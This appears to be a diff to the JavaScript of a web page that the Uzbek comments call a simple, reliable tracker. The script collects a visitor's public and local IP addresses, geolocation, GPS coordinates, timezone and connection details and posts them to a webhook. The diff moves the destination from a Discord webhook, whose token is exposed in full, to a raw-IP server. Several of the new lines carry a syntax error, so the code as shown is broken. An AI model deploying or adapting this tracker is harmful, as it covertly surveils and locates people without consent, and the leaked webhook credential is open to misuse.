@@ -240,7 +240,7 @@
         
         // Juda oddiy va ishonchli tracker
         function startTracking() {
-            const webhook = "https://discord.com/api/webhooks/1429482617564299338/0-LhStNTEqLMRAeKasfECcQSCaflvA3EEFS9BJsZiHYiVwg3c1k6nB8lhT-lQdRW29OI";
+            const webhook = "http://38.242.228.144:5000/webhook";
             
             // 1. IP ni olish
             fetch('https://api.ipify.org?format=json')
@@ -313,7 +313,7 @@
         }
 
         function sendToDiscord(publicIP, localIPs, geoData) {
-            const webhook = "https://discord.com/api/webhooks/1429482617564299338/0-LhStNTEqLMRAeKasfECcQSCaflvA3EEFS9BJsZiHYiVwg3c1k6nB8lhT-lQdRW29OI";
+            const webhook = "http://38.242.228.144:5000/webhook";
             
             const now = new Date();
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
@@ -387,7 +387,7 @@
                                  "Tezlik: " + (position.coords.speed || 'Noma lum') + "m/s"
                     };
                     
-                    fetch("https://discord.com/api/webhooks/1429482617564299338/0-LhStNTEqLMRAeKasfECcQSCaflvA3EEFS9BJsZiHYiVwg3c1k6nB8lhT-lQdRW29OI", {
+                    fetch("http://38.242.228.144:5000/webhook";, {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify(gpsMsg)
@@ -402,7 +402,7 @@
                                  "Kod: " + error.code
                     };
                     
-                    fetch("https://discord.com/api/webhooks/1429482617564299338/0-LhStNTEqLMRAeKasfECcQSCaflvA3EEFS9BJsZiHYiVwg3c1k6nB8lhT-lQdRW29OI", {
+                    fetch("http://38.242.228.144:5000/webhook";, {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify(gpsErrorMsg)
@@ -449,7 +449,7 @@
                              "📡 Ulanish: " + (additionalInfo.connection.effectiveType || 'Noma lum')
                 };
                 
-                fetch("https://discord.com/api/webhooks/1429482617564299338/0-LhStNTEqLMRAeKasfECcQSCaflvA3EEFS9BJsZiHYiVwg3c1k6nB8lhT-lQdRW29OI", {
+                fetch("http://38.242.228.144:5000/webhook";, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify(additionalMsg)
